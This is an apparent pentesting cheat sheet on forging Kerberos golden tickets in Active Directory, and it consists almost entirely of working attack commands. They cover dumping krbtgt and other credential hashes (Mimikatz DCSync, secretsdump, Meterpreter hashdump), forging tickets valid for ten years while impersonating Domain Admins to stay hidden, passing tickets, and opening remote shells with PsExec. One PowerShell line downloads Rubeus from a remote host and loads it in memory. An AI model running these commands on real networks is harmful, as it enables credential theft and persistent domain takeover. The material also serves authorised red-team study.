# Golden Ticket

## 01 - Mimikatz

### 1.1 - Manual

```
mimikatz # privilege::debug
Privilege '20' OK
```

Note down the domain name, domain controller, and Object Security ID which is the SID (ignore the last digits before the dash like `-501` for example)

`mimikatz # lsadump::dcsync /domain:<domain_name> /user:krbtgt`

Finally to generate a golden ticket to authenticate as an admin in order to maintain persistence it is recommended for OPSEC reasons that instead of making a new username (like **sysadmin** or **Administrator**) which you can but it's better to impersonate one of the user accounts that is part of **Domain Admins**

Run this command to check which users are part of the **Domain Admins** group to impersonate it (note it will last for 10 years)

```
C:\> net group "domain admins" /domain

mimikatz # kerberos::golden /domain:<domain_name> /sid:<sid> /krbtgt:<krbtgt_ntlm_hash> /id:500 /user:<domain_admin_user_account_to_impersonate> /ptt
```

Note: you can export the ticket to save for further use in the future

```
mimikatz # kerberos::golden /domain:<domain_name> /sid:<sid> /krbtgt:<krbtgt_ntlm_hash> /id:500 /user:<domain_admin_user_account_to_impersonate> /ticket:golden_ticket.kirbi /ptt
```

List the golden ticket account to see if you're authenticated (Your current session)

```
C:\> klist

mimikatz # kerberos::list

mimikatz # kerberos::tgt
```

To export a golden ticket that is already authenticated in the active directory

`mimikatz # kerberos::list /export`

Pass The Ticket

`mimikatz # kerberos::ptt golden_ticket.kirbi`

Dump the hashes

```
mimikatz # lsadump::lsa [/patch | /inject] /name:krbtgt

mimikatz # kerberos::golden /user:totallylegitadmin /domain:<domain_name> /sid:<sid> /krbtgt:<krbtgt_ntlm_hash> /ptt

mimikatz # kerberos::golden /user:totallylegitadmin /domain:<domain_name> /sid:<sid> /aes256:<aes256_hash> /groups:512,513,519 /startoffset:-1 /endin:2500 /renewmax:3000 /ptt

mimikatz # misc::cmd

C:\> PsExec64.exe -accepteula \\<IP> cmd.exe
```

### 1.2 - Impacket

Get the Domain SID

`$ lookupsid.py <domain_name>/<username>:<password>@<IP>`

Then dump the hashes

`$ secretsdump.py -just-dc-ntlm <domain_name>/<username>:<password>@<IP>`

Convert it to golden ticket

`$ ticketer.py -nthashes <ntlm_hash> -domain-sid <sid> -domain <domain_name> <username>`

### 1.3 - Metasploit

#### 1.3.1 - Meterpreter

- **Dump the credentials**

```
meterpreter > hashdump

meterpreter > run post/windows/gather/smart_hashdump
```

- **Create a golden ticket for persistence**

`meterpreter > golden_ticket_create -u <username> -d <domain_name> -k <NTLM_hash> -s <SID> -t /path/to/export/golden_ticket.kirbi`

- **Same windows command that uses `klist`**

`meterpreter > kerberos_ticket_list`

- **Pretty sure when you ran the golden_ticket module it should've stored somewhere on `/home/$USER/.msf4/loot/` or `/root/.msf4/loot/`**

`meterpreter > kerberos_ticket_use <golden_ticket>`

- **You can see the same golden ticket has been imported**

`meterpreter > kerberos_ticket_list`

- **Get rid of the golden ticket**

`meterpreter > kerberos_ticket_purge`

- **Thus we can run kiwi commands as it can be used as a regular mimikatz**

```
meterpreter > kiwi_cmd '"lsadump::dcsync /user:administrator"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:krbtgt"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:<username>"'
```

#### 1.3.2 - Modules

##### 1.3.2.1 - Post

- **Create a golden ticket for persistence**

```
msf exploit(multi/handler) > use post/windows/escalate/golden_ticket

msf post(windows/escalate/golden_ticket) > options

Module options (post/windows/escalate/golden_ticket):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DOMAIN                        no        Target Domain
   Domain SID                    no        Domain SID
   END_IN       87608            yes       End in ... Duration in hours, default 10 YEARS (~87608 hours)
   GROUPS                        no        ID of Groups (Comma Separated)
   ID                            no        Target User ID
   KRBTGT_HASH                   no        KRBTGT NTLM Hash
   SESSION                       yes       The session to run this module on
   USE          false            yes       Use the ticket in the current session
   USER                          no        Target User

msf post(windows/esclate/golden_ticket) > set krbtgt_hash <ntlm_hash>

msf post(windows/esclate/golden_ticket) > set domain <domain_name>

msf post(windows/esclate/golden_ticket) > set domain sid <domain_sid>
```

By default it is set to "administrator"

```
msf post(windows/esclate/golden_ticket) > set user <username>

msf post(windows/esclate/golden_ticket) > set session <session_id>
```

By default it is set to 87608 (duration of 10 years)

```
msf post(windows/esclate/golden_ticket) > set end_in <>

msf post(windows/esclate/golden_ticket) > set groups 512,513,518,519,520

msf post(windows/esclate/golden_ticket) > run

msf post(windows/esclate/golden_ticket) > sessions -i <session_id>
```

### 1.4 - Sliver

TODO: Fill this info

### 1.5 - Covenant

TODO: Fill this info

### 1.6 - Cobalt Strike

TODO: Fill this info

## 02 - Rubeus

### 2.1 - Manual

#### 2.1.1 - Pass The Ticket

- Run it memory

```powershell
PS C:\> $data = (New-Object Net.WebClient).DownloadString('http://<IP>/Rubeus.exe')
$assembly = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
```

- Generate a golden ticket

```powershell
PS C:\> [Rubeus.Program]::Main("s4u /user:<username> /rc4:<ntlm_hash> /impersonateuser:Administrator /msdsspn:<SPN>/<IP> /ptt".Split())

PS C:\> Rubeus.exe s4u /user:<username> /rc4:<ntlm_hash> /impersonateuser:Administrator /msdsspn:<SPN>/<IP> /ptt

PS C:\> klist

PS C:\> Rubeus.exe triage

PS C:\> Rubeus.exe klist

PS C:\> ls \\<IP>\c$

PS C:\> Rubeus.exe ptt /ticket:golden_ticket.kirbi

PS C:\> Rubeus.exe ptt /ticket:<base64_encoded_golden_ticket>
```

### 2.2 - Sliver

TODO: Fill this info

### 2.3 - Covenant

TODO: Fill this info

## 03 - Impacket

### 3.1 - PsExec

```
$ export KRB5CCNAME=/path/to/ticket.ccache

$ psexec.py <domain_name>/<username>@<IP> -k -no-pass
```

---
## References

- [Hackndo: Kerberos Sliver Golden Tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/)

- [PentestLab: Golden Ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)

- [Metasploit For Pentester Mimikatz](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/)